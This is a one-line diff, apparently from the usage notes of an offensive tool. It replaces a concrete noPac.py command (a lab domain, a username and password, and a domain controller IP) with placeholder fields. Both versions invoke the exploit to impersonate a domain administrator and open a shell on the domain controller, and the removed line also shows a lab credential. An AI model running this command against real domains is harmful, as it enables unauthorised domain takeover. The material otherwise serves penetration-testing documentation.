@@ -1,1 +1,1 @@
-python .\noPac.py tamtest.local/user1:Abc123!! -dc-ip 192.168.253.100 -shell --impersonate administrator -use-ldap
+python noPac.py <CASE_SENSITIVE_DOMAIN_FQDN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -shell --impersonate <DOMAIN_ADMIN_USER> -use-ldap
